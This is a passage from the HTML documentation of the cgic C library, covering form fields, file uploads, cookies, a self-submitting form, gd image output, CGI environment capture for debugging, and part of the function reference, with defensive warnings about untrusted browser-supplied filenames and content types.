\"&lt;ul&gt;\\n\");\n    while (responses[i]) {\n      fprintf(<a href=\"#cgiOut\">cgiOut<\/a>, \"&lt;li&gt;%s\\n\", responses[i]);\n      i++;\n    }\n    fprintf(<a href=\"#cgiOut\">cgiOut<\/a>, \"&lt;\/ul&gt;\\n\");\n  }\n  \/* We must be sure to free the string array or a memory\n    leak will occur. Simply calling free() would free\n    the array but not the individual strings. The\n    function cgiStringArrayFree() does the job completely. *\/  \n  <A HREF=\"#cgiStringArrayFree\">cgiStringArrayFree<\/a>(responses);\n}\n<\/PRE>\nThis code excerpt demonstrates an alternate means of retrieving\na list of choices. The function\n<a href=\"#cgiFormStringMultiple\">cgiFormStringMultiple()<\/a> is used\nto retrieve an array consisting of all the strings submitted\nfor with a particular input field name. This works both for\n&lt;SELECT&gt; tags with the MULTIPLE attribute and for \ngroups of checkboxes with the same name. \n<P>\nThe first argument to <a href=\"#cgiFormStringMultiple\">\ncgiFormStringMultiple()<\/a> is the name of the input field or\ngroup of input fields in question. The second argument should\nbe the address of a pointer to a pointer to a string, which\nisn't as bad as it sounds. Consider the following simple call\nof the function:\n<PRE>\n\/* An array of strings; each C string is an array of characters *\/\nchar **responses; \n\n<a href=\"#cgiFormStringMultiple\">cgiFormStringMultiple<\/a>(\"vote\", &amp;responses);\n<\/PRE>\n<em>\"How do I know how many responses there are?\"<\/em>\n<p>\nAfter the call, the last entry in the string array will be\na null pointer. Thus the simple loop:\n<PRE>\nint i = 0;\nwhile (responses[i]) {\n  \/* Do something with the string responses[i] *\/\n  i++;\n}\n<\/PRE>\ncan be used to walk through the array until the last\nentry is encountered.\n<p>\n<strong>Important:<\/strong> the \n<a href=\"#cgiFormStringMultiple\">cgiFormStringMultiple<\/a> function\nreturns a pointer to <strong>allocated memory<\/strong>. Your code\nshould not modify the strings in the responses array or the responses\narray itself; if modification is needed, the strings should be\ncopied. When your code is done examining the responses array,\nyou <strong>MUST<\/strong> call <a href=\"#cgiStringArrayFree\">\ncgiStringArrayFree()<\/a> with the array as an argument to free the memory \nassociated with the array. Otherwise, the memory will not be available \nagain until the program exists. <strong>Don't<\/strong> just call the \nfree() function; if you do, the individual strings will not be freed.\n<h4>Accessing Uploaded Files<\/h4>\nCGIC provides functions to access files that have been uploaded\nas part of a form submission. <strong>IMPORTANT: you MUST<\/strong> set\nthe <code>enctype<\/code> attribute of your <code>form<\/code> tag\nto <code>multipart\/form-data<\/code> for this feature to work! For an\nexample, see the <a href=\"#ShowForm\">ShowForm<\/a> function of \ncgictest.c, examined below.\n<p>\nThe <code>File<\/code> function of cgictest.c takes care of \nreceiving uploaded files:\n<pre>\nvoid File()\n{\n  cgiFilePtr file;\n  char name[1024];\n  char contentType[1024];\n  char buffer[1024];\n  int size;\n  int got;\n  if (cgiFormFileName(\"file\", name, sizeof(name)) != \n    cgiFormSuccess) \n  {\n    printf(\"&lt;p&gt;No file was uploaded.&lt;p&gt;\\n\");\n    return;\n  } \n        fprintf(cgiOut, \"The filename submitted was: \");\n        cgiHtmlEscape(name);\n        fprintf(cgiOut, \"&lt;p&gt;\\n\");\n        cgiFormFileSize(\"file\", &size);\n        fprintf(cgiOut, \"The file size was: %d bytes&lt;p&gt;\\n\", size);\n        cgiFormFileContentType(\"file\", contentType, sizeof(contentType));\n        fprintf(cgiOut, \"The alleged content type of the file was: \");\n        cgiHtmlEscape(contentType);\n        fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"Of course, this is only the claim the browser \"\n    \"made when uploading the file. Much like the filename, \"\n    \"it cannot be trusted.&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"The file's contents are shown here:&lt;p&gt;\\n\");\n  if (cgiFormFileOpen(\"file\", &file) != cgiFormSuccess) {\n    fprintf(cgiOut, \"Could not open the file.&lt;p&gt;\\n\");\n    return;\n  }\n  fprintf(cgiOut, \"&lt;pre&gt;\\n\");\n  while (cgiFormFileRead(file, buffer, sizeof(buffer), &got) ==\n    cgiFormSuccess)\n  {\n    cgiHtmlEscapeData(buffer, got);\n  }\n  fprintf(cgiOut, \"&lt;\/pre&gt;\\n\");\n  cgiFormFileClose(file);\n}\n<\/pre>\nFirst, the File function checks to determine the filename that was\nsubmitted by the user. <strong>VERY IMPORTANT: this filename may or\nmay not bear any relation to the real name of the file on the user's\ncomputer, may be deliberately manipulated with malicious intent,<\/strong>\nand should not be used for <strong>any<\/strong> purpose unless you have\ndetermined that its content is safe for your intended use and will not,\nat the very least, overwrite another file of importance to you, especially if\nyou intend to use it as a file name on the server side. The cgic library\nitself does not use this file name for temporary storage.\n<p>\nIf the <a href=\"#cgiFormFileName\">cgiFormFileName<\/a> function does\nnot succeed, no file was uploaded.\n<p>\nNext, the <a href=\"#cgiFormFileSize\">cgiFormFileSize<\/a> function is called\nto determine the size of the uploaded file, in bytes.\n<p>\nThe File function then proceeds to query the content type of the uploaded\nfile.  Files uploaded by the user have their own content type information, \nwhich may be useful in determining whether the file is an image, HTML document,\nword processing document, or other type of file. However,\n<strong>as with the filename and any other claim made by the browser,\nthis information should not be blindly trusted.<\/strong> The browser\nmay upload a file with the name <code>picture.jpg<\/code> and the\ncontent type <code>image\/jpeg<\/code>, but this does not guarantee that the\nactual file will contain a valid JPEG image suitable for display.\n<p>\nThe content type submitted by the browser can be queried using the\n<a href=\"#cgiFormFileContentType\">cgiFormFileContentType<\/a> function.\n<p>\nOf course, CGIC also provides access to the actual uploded file. \nFirst, the programmer calls <a href=\"#cgiFormFileOpen\">cgiFormFileOpen<\/a>,\npassing the address of a <code>cgiFilePtr<\/code> object. If this function\nsucceeds, the <code>cgiFilePtr<\/code> object becomes valid, and can be\nused in subsequent calls to <a href=\"#cgiFormFileRead\">cgiFormFileRead<\/a>.\nNotice that the number of bytes read may be less than the number requested,\nin particular on the last successful call before cgiFormFileRead begins\nto return <code>cgiFormEOF<\/code>. When cgiFormFileRead no longer returns \ncgiFormSuccess, \nthe programmer calls <a href=\"#cgiFormClose\">cgiFormFileClose<\/a> to\nrelease the <code>cgiFilePtr<\/code> object.\n<p>\nThe uploaded file data may contain anything, including binary data,\nnull characters, and so on. The example program uses the \n<a href=\"#cgiHtmlEscapeData\">cgiHtmlEscapeData<\/a> function to output the\ndata with any special characters that have meaning in HTML escaped.\nMost programs will save the uploaded information to a server-side file or\ndatabase.\n<h4>Fetching All Form Entries<\/h4>\nFrom time to time, the programmer may not know the names of all\nform fields in advance. In such situations it is convenient to\nuse the <a href=\"#cgiFormEntries\">cgiFormEntries<\/a> function.\nThe Entries function of cgictest.c demonstrates the use of\ncgiFormEntries:\n<pre>\nvoid Entries()\n{\n        char **array, **arrayStep;\n        fprintf(cgiOut, \"List of All Submitted Form Field Names:&lt;p&gt;\\n\");\n        if (cgiFormEntries(&array) != cgiFormSuccess) {\n                return;\n        }\n        arrayStep = array;\n        fprintf(cgiOut, \"&lt;ul&gt;\\n\");\n        while (*arrayStep) {\n                fprintf(cgiOut, \"&lt;li&gt;\");\n                cgiHtmlEscape(*arrayStep);\n                fprintf(cgiOut, \"\\n\");\n                arrayStep++;\n        }\n        fprintf(cgiOut, \"&lt;\/ul&gt;\\n\");\n        cgiStringArrayFree(array);\n}\n<\/pre>\nThe cgiFormEntries function retrieves an array of form field names.\nThis array consists of pointers to strings, with a final null pointer\nto mark the end of the list. The above code illustrates one way of\nlooping through the returned strings. Note the final call to\n<a href=\"#cgiStringArrayFree\">cgiStringArrayFree<\/a>, which is\nessential in order to return the memory used to store the strings\nand the string array.\n<h4>Retrieving Cookies<\/h4>\nThe Cookies function of cgictest.c displays a list of all cookies\nsubmitted by the browser with the current form submission, along\nwith their values:\n<pre>\nvoid Cookies()\n{\n  char **array, **arrayStep;\n  char cname[1024], cvalue[1024];\n  fprintf(cgiOut, \"Cookies Submitted On This Call, With Values \"\n    \"(Many Browsers NEVER Submit Cookies):&lt;p&gt;\\n\");\n  if (cgiCookies(&array) != cgiFormSuccess) {\n    return;\n  }\n  arrayStep = array;\n  fprintf(cgiOut, \"&lt;table border=1&gt;\\n\");\n  fprintf(cgiOut, \"&lt;tr&gt;&lt;th&gt;Cookie&lt;th&gt;Value&lt;\/tr&gt;\\n\");\n  while (*arrayStep) {\n    char value[1024];\n    fprintf(cgiOut, \"&lt;tr&gt;\");\n    fprintf(cgiOut, \"&lt;td&gt;\");\n    cgiHtmlEscape(*arrayStep);\n    fprintf(cgiOut, \"&lt;td&gt;\");\n    cgiCookieString(*arrayStep, value, sizeof(value));\n    cgiHtmlEscape(value);\n    fprintf(cgiOut, \"\\n\");\n    arrayStep++;\n  }\n  fprintf(cgiOut, \"&lt;\/table&gt;\\n\");\n  cgiFormString(\"cname\", cname, sizeof(cname));  \n  cgiFormString(\"cvalue\", cvalue, sizeof(cvalue));  \n  if (strlen(cname)) {\n    fprintf(cgiOut, \"New Cookie Set On This Call:&lt;p&gt;\\n\");\n    fprintf(cgiOut, \"Name: \");  \n    cgiHtmlEscape(cname);\n    fprintf(cgiOut, \"Value: \");  \n    cgiHtmlEscape(cvalue);\n    fprintf(cgiOut, \"&lt;p&gt;\\n\");\n    fprintf(cgiOut, \"If your browser accepts cookies \"\n      \"(many do not), this new cookie should appear \"\n      \"in the above list the next time the form is \"\n      \"submitted.&lt;p&gt;\\n\"); \n  }\n  cgiStringArrayFree(array);\n}\n<\/pre>\n<strong>VERY IMPORTANT: YOUR BROWSER MIGHT NOT SUBMIT COOKIES,\nEVER, REGARDLESS OF WHAT VALUES YOU ENTER INTO THE TEST FORM.<\/strong>\nMany, many browsers are configured not to accept or send cookies;\nothers are configured to send them as little as possible to meet the\nbare minimum requirements for entry into popular sites. Users will often\nrefuse your cookies; make sure your code still works in that situation!\n<p>\nThe above code uses the <a href=\"#cgiCookies\">cgiCookies<\/a> function\nto retrieve a list of all currently set cookies as a null-terminated\narray of strings. The <a href=\"#cgiCookieString\">cgiCookieString<\/a>\nfunction is then used to fetch the value associated with each cookie;\nthis function works much like <a href=\"#cgiFormString\">cgiFormString<\/a>,\ndiscussed earlier. Note that a cookie set as a part of the current\nform submission process does not appear on this list immediately, as\nit has not yet been sent back by the browser. It should appear on\nfuture submissions, provided that the browser chooses to accept\nand resend the cookie at all.\n<h4>Displaying a Form That Submits to the Current Program<\/h4>\nCGI programmers often need to display HTML pages as part of the output\nof CGI programs; these HTML pages often contain forms which should submit\nfields back to the same program they came from. Provided that your\nweb server is well-configured, this can be done conveniently using\nthe cgiScriptName environment variable, as shown below. Here is the\nsource code of the ShowForm function of cgictest.c:\n<pre>\nvoid ShowForm()\n{\n  fprintf(cgiOut, \"&lt;!-- 2.0: multipart\/form-data is required \n    \"for file uploads. --&gt;\");\n  fprintf(cgiOut, \"&lt;form method=\\\"POST\\\" \"\n    \"enctype=\\\"multipart\/form-data\\\" \");\n  fprintf(cgiOut, \"  action=\\\"\");\n  cgiValueEscape(cgiScriptName);\n  fprintf(cgiOut, \"\\\"&gt;\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"Text Field containing Plaintext\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"text\\\" name=\\\"name\\\"&gt;Your Name\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"Multiple-Line Text Field\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"&lt;textarea NAME=\\\"address\\\" ROWS=4 COLS=40&gt;\\n\");\n  fprintf(cgiOut, \"Default contents go here. \\n\");\n  fprintf(cgiOut, \"&lt;\/textarea&gt;\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"Checkbox\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"checkbox\\\" name=\\\"hungry\\\" checked&gt;Hungry\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"Text Field containing a Numeric Value\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"text\\\" name=\\\"temperature\\\" value=\\\"98.6\\\"&gt;\\n\");\n  fprintf(cgiOut, \"Blood Temperature (80.0-120.0)\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"Text Field containing an Integer Value\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"text\\\" name=\\\"frogs\\\" value=\\\"1\\\"&gt;\\n\");\n  fprintf(cgiOut, \"Frogs Eaten\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"Single-SELECT\\n\");\n  fprintf(cgiOut, \"&lt;br&gt;\\n\");\n  fprintf(cgiOut, \"&lt;select name=\\\"colors\\\"&gt;\\n\");\n  fprintf(cgiOut, \"&lt;option value=\\\"Red\\\"&gt;Red\\n\");\n  fprintf(cgiOut, \"&lt;option value=\\\"Green\\\"&gt;Green\\n\");\n  fprintf(cgiOut, \"&lt;option value=\\\"Blue\\\"&gt;Blue\\n\");\n  fprintf(cgiOut, \"&lt;\/select&gt;\\n\");\n  fprintf(cgiOut, \"&lt;br&gt;\\n\");\n  fprintf(cgiOut, \"Multiple-SELECT\\n\");\n  fprintf(cgiOut, \"&lt;br&gt;\\n\");\n  fprintf(cgiOut, \"&lt;select name=\\\"flavors\\\" multiple&gt;\\n\");\n  fprintf(cgiOut, \"&lt;option value=\\\"pistachio\\\"&gt;Pistachio\\n\");\n  fprintf(cgiOut, \"&lt;option value=\\\"walnut\\\"&gt;Walnut\\n\");\n  fprintf(cgiOut, \"&lt;option value=\\\"creme\\\"&gt;Creme\\n\");\n  fprintf(cgiOut, \"&lt;\/select&gt;\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;Exclusive Radio Button Group: Age of \"\n    \"Truck in Years\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"radio\\\" name=\\\"age\\\" \"\n    \"value=\\\"1\\\"&gt;1\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"radio\\\" name=\\\"age\\\" \"\n    \"value=\\\"2\\\"&gt;2\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"radio\\\" name=\\\"age\\\" \"\n    \"value=\\\"3\\\" checked&gt;3\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"radio\\\" name=\\\"age\\\" \"\n    \"value=\\\"4\\\"&gt;4\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;Nonexclusive Checkbox Group: \"\n    \"Voting for Zero through Four Candidates\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"checkbox\\\" name=\\\"vote\\\" \"\n    \"value=\\\"A\\\"&gt;A\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"checkbox\\\" name=\\\"vote\\\" \"\n    \"value=\\\"B\\\"&gt;B\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"checkbox\\\" name=\\\"vote\\\" \"\n    \"value=\\\"C\\\"&gt;C\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"checkbox\\\" name=\\\"vote\\\" \"\n    \"value=\\\"D\\\"&gt;D\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;File Upload:\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"file\\\" name=\\\"file\\\" \"\n    \"value=\\\"\\\"&gt; (Select A Local File)\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;Set a Cookie&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"&lt;input name=\\\"cname\\\" \"\n    \"value=\\\"\\\"&gt; Cookie Name\\n\");\n  fprintf(cgiOut, \"&lt;input name=\\\"cvalue\\\" \"\n    \"value=\\\"\\\"&gt; Cookie Value&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"submit\\\" \"\n    \"name=\\\"testcgic\\\" value=\\\"Submit Request\\\"&gt;\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"reset\\\" \"\n    \"value=\\\"Reset Request\\\"&gt;\\n\");\n  fprintf(cgiOut, \"&lt;p&gt;Save the CGI Environment&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"Pressing this button will submit the form, then \"\n    \"save the CGI environment so that it can be replayed later \"\n    \"by calling cgiReadEnvironment (in a debugger, for \"\n    \"instance).&lt;p&gt;\\n\");\n  fprintf(cgiOut, \"&lt;input type=\\\"submit\\\" name=\\\"saveenvironment\\\" \"\n    \"value=\\\"Save Environment\\\"&gt;\\n\");\n  fprintf(cgiOut, \"&lt;\/form&gt;\\n\");\n}\n<\/pre>\nNote the use of <code>enctype=\"multipart\/form-data\"<\/code> in the\n<code>FORM<\/code> tag. This is absolutely required if the form\nwill contain file upload fields, as in the above example. Most\nbrowsers will not even attempt file uploads without the\npresence of this attribute.\n<h4>Examining CGI environment variables<\/h4>\nThe CGI standard specifies a number of environment variables\nwhich are set by the server. However, servers are somewhat\nunpredictable as to whether these variables will be null or\npoint to empty strings when an environment variable is not set.\nAlso, in order to allow the programmer to restore saved\nCGI environments, the cgic library needs have a way of insulating\nthe programmer from the actual environment variables.\n<p>\nInstead of calling getenv() to determine the value of a\nvariable such as HTTP_USER_AGENT (the browser software being used),\nalways use the\n<a href=\"#variables\">cgic copies of the environment variables<\/a>,\nwhich are always valid C strings (they are never null, although\nthey may point to an empty string). For instance, the cgic\nvariable containing the name of the browser software is\n<a href=\"#cgiUserAgent\">cgiUserAgent<\/a>. The referring URL appears\nin the variable <a href=\"#cgiReferrer\">cgiReferrer<\/a>.\n<h3><a name=\"images\">How can I generate images from my cgic application?<\/a><\/h3>\ncgic can be used in conjunction with the\n<a href=\"https:\/\/libgd.github.io\/\">gd graphics library<\/a>, which\ncan produce GIF images on the fly.\n<p>\nThe following short sample program hints at the possibilities:\n<pre>\n#include \"cgic.h\"\n#include \"gd.h\"\n\nchar *colors[] = {\n  \"red\", \"green\", \"blue\"\n};\n\n#define colorsTotal 3\n\nint cgiMain() {\n  int colorChosen;\n  gdImagePtr im;\n  int r, g, b;\n  \/* Use gd to create an image *\/\n  im = gdImageCreate(64, 64);\n  r = gdImageColorAllocate(im, 255, 0, 0);  \n  g = gdImageColorAllocate(im, 0, 255, 0);  \n  b = gdImageColorAllocate(im, 0, 0, 255);  \n  \/* Now use cgic to find out what color the user requested *\/\n  <a href=\"#cgiFormSelectSingle\">cgiFormSelectSingle<\/a>(\"color\", 3, &amp;colorChosen, 0);  \n  \/* Now fill with the desired color *\/\n  switch(colorChosen) {\n    case 0:\n    gdImageFill(im, 32, 32, r);\n    break;\n    case 1:\n    gdImageFill(im, 32, 32, g);\n    break;\n    case 2:\n    gdImageFill(im, 32, 32, b);\n    break;\n  }  \n  \/* Now output the image. Note the content type! *\/\n  cgiHeaderContentType(\"image\/gif\");\n  \/* Send the image to cgiOut *\/\n  gdImageGif(im, cgiOut);\n  \/* Free the gd image *\/\n  gdImageDestroy(im);\n  return 0;\n}\n<\/pre>\nNote that this program would need to be linked with both cgic.o\nand libgd.a. Often programs of this type respond to one\ncgiPathInfo value or set of form fields by returning an HTML page \nwith an inline image reference that, in turn, generates a GIF image.\n<h3><a name=\"debug\">Debugging CGI applications: using capture<\/a><\/h3>\nDebugging CGI applications can be a painful task. Since CGI applications\nrun in a special environment created by the web server, it is difficult\nto execute them in a debugger. However, the cgic library provides a way \nof capturing \"live\" CGI environments to a file, and also provides a way\nto reload saved environments. \n<p>\nThe provided program 'capture.c' can be used to capture CGI\nenvironments. Just change the first line of the cgiMain() function\nof capture.c to save the CGI environment to a filename appropriate\non your system and type 'make capture'. Then place capture in your\ncgi directory and set the form action or other link you want to test\nto point to it. When the form submission or other link takes place,\ncapture will write the CGI environment active at that time to\nthe filename you specified in the source. The\n<a href=\"#cgiReadEnvironment\">cgiReadEnvironment()<\/a> function can then \nbe invoked on the same filename at the beginning of the cgiMain() function \nof the application you want to test in order to restore the captured \nenvironment.  You can then execute your program in the debugger of your choice,\nand it should perform exactly as it would have performed had\nit been launched by the actual web server, including file uploads,\ncookies and all other phenomena within the purview of cgic.\n<p>\n<strong>Important:<\/strong> Make sure you specify the full path, as the\ncurrent working directory of a CGI script may not be what you\nthink it is!\n<p>\n<strong>Even More Important:<\/strong> If you call getenv() yourself\nin your code, instead of using the provided <a href=\"#variables\">\ncgic copies of the CGI environment variables<\/a>, you will\n<em>not<\/em> get the values you expect when running with\na saved CGI environment. Always use the cgic variables instead\nof calling getenv().\n<h3><a name=\"functions\">cgic function reference<\/a><\/h3>\n<dl>\n<br><dt><strong><a name=\"cgiFormString\">cgiFormResultType cgiFormString(\n  char *name, char *result, int max)<\/a>\n<\/strong><br><dd>cgiFormString attempts to retrieve the string sent for the\n  specified input field. The text will be copied into\n  the buffer specified by result, up to but not\n  exceeding max-1 bytes; a terminating null is then\n  added to complete the string. Regardless of the newline\n  format submitted by the browser, cgiFormString always\n  encodes each newline as a single line feed (ascii decimal 10); as\n  a result the final string may be slightly shorter than indicated\n  by a call to <a href=\"#cgiFormStringSpaceNeeded\">\n  cgiFormStringSpaceNeeded<\/a> but will never be longer.\n  cgiFormString returns <a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a> if the string was \n  successfully retrieved, \n  <a href=\"#cgiFormTruncated\">cgiFormTruncated<\/a> if the string was\n  retrieved but was truncated to fit the buffer,\n  cgiFormEmpty if the string was \n  retrieved but was empty, and <a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a> if no \n  such input field was submitted. In the last case, \n  an empty string is copied to result. \n<br><br><dt><strong><a name=\"cgiFormStringNoNewlines\">\ncgiFormResultType cgiFormStringNoNewlines(\n  char *name, char *result, int max)<\/a>\n<\/strong><br><dd>\ncgiFormStringNoNewlines() is exactly equivalent to <a href=\"#cgiFormString\">\n  cgiFormString()<\/a>, except\n  that any carriage returns or line feeds that occur in the input\n  will be stripped out. The use of this function is recommended\n  for single-line text input fields, as some browsers will submit\n  carriage returns and line feeds when they should not. \n<br><br><dt><strong><a name=\"cgiFormStringSpaceNeeded\">\ncgiFormResultType cgiFormStringSpaceNeeded(\n  char *name, int *length)<\/a>\n<\/strong><br><dd>\ncgiFormStringSpaceNeeded() is used to determine the length of the input text \n  buffer needed to receive the contents of the specified input field. \n  This is useful if the programmer wishes to allocate sufficient memory \n  for input of arbitrary length. The actual length of the string \n  retrieved by a subsequent call to cgiFormString() may be slightly shorter\n  but will never be longer than *result. On success, cgiFormStringSpaceNeeded() \n  sets the value pointed to by length to the number of bytes of data, \n  including the terminating null, and returns <a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a>. If no \n  value was submitted for the specified field, cgiFormStringSpaceNeeded sets \n  the value pointed to by length to 1 and returns <a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a>. 1 is\n  set to ensure space for an empty string (a single null\n  character) if cgiFormString is called despite the return value.\n\n<br><br><dt><strong><a name=\"cgiFormStringMultiple\">cgiFormResultType cgiFormStringMultiple(\n  char *name, char ***ptrToStringArray)<\/a>\n<\/strong><br><dd>cgiFormStringMultiple is useful in the unusual case in which several\n  input elements in the form have the same name and, for whatever\n  reason, the programmer does not wish to use the checkbox, radio \n  button and selection menu functions provided below. This is\n  occasionally needed if the programmer cannot know \n  in advance what values might appear in a multiple-selection list\n  or group of checkboxes on a form. The value pointed to\n  by result will be set to a pointer to an array of strings; the last\n  entry in the array will be a null pointer.  This array is allocated \n  by the CGI library. Important: when done working with the array,\n  you must call cgiStringArrayFree() with the array pointer as the \n  argument.  cgiFormStringMultiple() returns <a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a> if at least\n  one occurrence of the name is found, <a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a>\n  if no occurrences are found, or cgiFormMemory if not enough\n  memory is available to allocate the array to be returned.\n  In all cases except the last, ptrToStringArray is set to point to a \n  valid array of strings, with the last element in the array being a \n  null pointer; in the out-of-memory case ptrToStringArray is set to \n  a null pointer.\n\n<br><br><dt><strong><a name=\"cgiFormEntries\">cgiFormResultType cgiFormEntries(\n  char ***ptrToStringArray)<\/a>\n<\/strong><br><dd>cgiFormEntries is useful when the programmer cannot know the names\n  of all relevant form fields in advance. The value pointed to\n  by result will be set to a pointer to an array of strings; the last\n  entry in the array will be a null pointer.  This array is allocated \n  by the CGI library. Important: when done working with the array,\n  you must call cgiStringArrayFree() with the array pointer as the \n  argument. cgiFormEntries() returns <a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a> except in the event of an out of memory error.\n  On success, ptrToStringArray is set to point to a \n  valid array of strings, with the last element in the array being a \n  null pointer; in the out-of-memory case ptrToStringArray is set to \n  a null pointer, and \n  <a href=\"#cgiFormOutOfMemory\">cgiFormOutOfMemory<\/a> is returned.\n\n<br><br><dt><strong><a name=\"cgiStringArrayFree\">void cgiStringArrayFree(char **stringArray)\n<\/a>\n<\/strong><br><dd>\ncgiStringArrayFree() is used to free the memory associated with\n  a string array created by \n  <a href=\"#cgiFormStringMultiple\">cgiFormStringMultiple()<\/a>,\n  <a href=\"#cgiFormEntries\">cgiFormEntries()<\/a>, or\n  <a href=\"#cgiFormCookies\">cgiFormCookies()<\/a>.\n<br><br><dt><strong><a name=\"cgiFormInteger\">cgiFormResultType cgiFormInteger(\n  char *name, int *result, int defaultV)<\/a>\n<\/strong><br><dd>cgiFormInteger() attempts to retrieve the integer sent for the\n  specified input field. The value pointed to by result\n  will be set to the value submitted. cgiFormInteger() returns \n  cgiFormSuccess if the value was successfully retrieved,\n  cgiFormEmpty if the value submitted is an empty string,\n  cgiFormBadType if the value submitted is not an integer,\n  and <a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a> if no such input field was submitted. \n  In the last three cases, the value pointed to by result\n  is set to the specified default.\n<br><br><dt><strong><a name=\"cgiFormIntegerBounded\">\ncgiFormResultType cgiFormIntegerBounded(\n  char *name, int *result, int min, int max, int defaultV)<\/a>\n<\/strong><br><dd>cgiFormIntegerBounded() attempts to retrieve the integer sent for the\n  specified input field, and constrains the result to be within\n  the specified bounds. The value pointed to by result\n  will be set to the value submitted. cgiFormIntegerBounded() returns \n  cgiFormSuccess if the value was successfully retrieved,\n  <a href=\"#cgiFormConstrained\">cgiFormConstrained<\/a> if the value was out of bounds and result\n  was adjusted accordingly, <a href=\"#cgiFormEmpty\">cgiFormEmpty<\/a> if the value submitted is \n  an empty string, <a href=\"#cgiFormBadType\">cgiFormBadType<\/a> if the value submitted is not an \n  integer, and <a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a> if no such input field was submitted. \n  In the last three cases, the value pointed to by result\n  is set to the specified default.\n\n<br><br><dt><strong><a name=\"cgiFormDouble\">cgiFormResultType cgiFormDouble(\n  char *name, double *result, double defaultV)<\/a>\n<\/strong><br><dd>cgiFormDouble attempts to retrieve the floating-point value sent for \n  the specified input field. The value pointed to by result\n  will be set to the value submitted. cgiFormDouble returns \n  cgiFormSuccess if the value was successfully retrieved,\n  cgiFormEmpty if the value submitted is an empty string,\n  cgiFormBadType if the value submitted is not a number,\n  and <a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a> if no such input field was submitted. \n  In the last three cases, the value pointed to by result\n  is set to the specified default. \n<br><br><dt><strong><a name=\"cgiFormDoubleBounded\">\ncgiFormResultType cgiFormDoubleBounded(\n  char *name, double *result, double min, double max, \n  double defaultV)<\/a>\n<\/strong><br><dd>\ncgiFormDoubleBounded() attempts to retrieve the floating-point\n  value  sent for the specified input field, and constrains the \n  result to be within the specified bounds. The value pointed to by \n  result will be set to the value submitted. cgiFormDoubleBounded() returns \n  cgiFormSuccess if the value was successfully retrieved,\n  <a href=\"#cgiFormConstrained\">cgiFormConstrained<\/a> if the value was out of bounds and result\n  was adjusted accordingly, <a href=\"#cgiFormEmpty\">cgiFormEmpty<\/a> if the value submitted is \n  an empty string, <a href=\"#cgiFormBadType\">cgiFormBadType<\/a> if the value submitted is not a \n  number, and <a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a> if no such input field was submitted. \n  In the last three cases, the value pointed to by result\n  is set to the specified default. \n\n<br><br><dt><strong><a name=\"cgiFormSelectSingle\">\ncgiFormResultType cgiFormSelectSingle(\n  char *name, char **choicesText, int choicesTotal, \n  int *result, int defaultV)<\/a>\n<\/strong><br><dd>\ncgiFormSelectSingle() retrieves the selection number associated with a\n  &lt;SELECT&gt; element that does not allow multiple selections. name\n  should identify the NAME attribute of the &lt;SELECT&gt; element. choicesText \n  should point to an array of strings identifying each choice; \n  choicesTotal should indicate the total number of choices. The value \n  pointed to by result will be set to the position of the actual choice\n  selected within the choicesText array, if any, or to the value of \n  default, if no selection was submitted or an invalid selection was \n  made.  cgiFormSelectSingle() returns <a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a> if the value was\n  successfully retrieved, <a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a> if no selection\n  was submitted, and <a href=\"#cgiFormNoSuchChoice\">cgiFormNoSuchChoice<\/a> if the selection\n  does not match any of the possibilities in the choicesText array. \n<br><dt><strong>\n<a name=\"cgiFormSelectMultiple\">\ncgiFormResultType cgiFormSelectMultiple(\n  char *name, char **choicesText, int choicesTotal, \n  int *result, int *invalid)<\/a>\n<\/strong><br><dd>cgiFormSelectMultiple() retrieves the selection numbers associated with a\n  &lt;SELECT&gt; element that does allow multiple selections. name should\n  identify the NAME attribute of the &lt;SELECT&gt; element. choicesText \n  should point to an array of strings identifying each choice; \n  choicesTotal should indicate the total number of choices. result\n  should point to an array of integers with as many elements as there\n  are strings in the choicesText array. For each choice in the\n  choicesText array that 